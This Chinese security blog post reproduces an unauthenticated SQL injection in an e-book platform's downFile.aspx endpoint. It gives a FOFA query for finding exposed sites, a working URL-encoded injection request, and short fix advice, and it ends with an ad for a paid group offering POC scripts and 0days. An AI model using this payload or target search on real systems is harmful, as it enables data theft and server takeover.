#  「漏洞复现」电子图书阅读平台 downFile.aspx SQL注入漏洞   
冷漠安全  冷漠安全   2024-12-12 13:41  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
电子图书阅读平台为用户提供了一种便捷、环保且资源丰富的阅读方式,支持简单检索、二次检索、高级检索及全文检索；同时支持教育部、中图法两种分类浏览方式。支持在线阅读与离线下载阅读两种方式。在线阅读时，读者可实时在线打开电子教材进行翻阅，但部分教材有并发用户限制。下载阅读需下载至平台自带的独立阅读器打开，单本电子书每次下载使用期一般为30天，到期前可重新登陆平台下载。  
  
0x03  
  
漏洞威胁  
  
电子图书阅读平台 downFile.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
body="/Index.aspx/SearchBy"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pK3iapPct30wS95Hl0LE5Dx6jDrahstuDxpyW6DBlWsND1hJ7aVbgaZMaBUE55Kaws5I8icsdeNOGw/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
GET /web/downFile.aspx?id=%27%2B%28SELECT+CHAR%2867%29%2BCHAR%2885%29%2BCHAR%2886%29%2BCHAR%2879%29+WHERE+1651%3D1651+AND+7828+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287828%3D7828%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%29%2B%27 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pK3iapPct30wS95Hl0LE5DxDxLkxmX9EbdnoicbIg7KqkDZa5gZS2Vy8Q9XUDcT2nvVe9Hicibm9L3gA/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pK3iapPct30wS95Hl0LE5Dxf7XkDDFl6vt44zXKPjiabqljuZjHCNspYWgL6WfTdzynlpGQsicvJZtA/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
对用户传入的参数进行限制。  
  
通过防火墙等安全设备设置访问策略，设置白名单访问。  
  
如非必要，禁止公网访问该系统。  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pK3iapPct30wS95Hl0LE5DxtTQ0Q5ibKoK5pf6vs66oA0LQVrRgZdSibFmm75A80wt4zLu1uKpBTx0Q/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pK3iapPct30wS95Hl0LE5Dx4jyRDVwxw4rDLsNDcYauj1oHBuYMCibob02rWfxLw16Tj5ZWEQFt2ZA/640?wx_fmt=gif&from=appmsg "")  
  
  
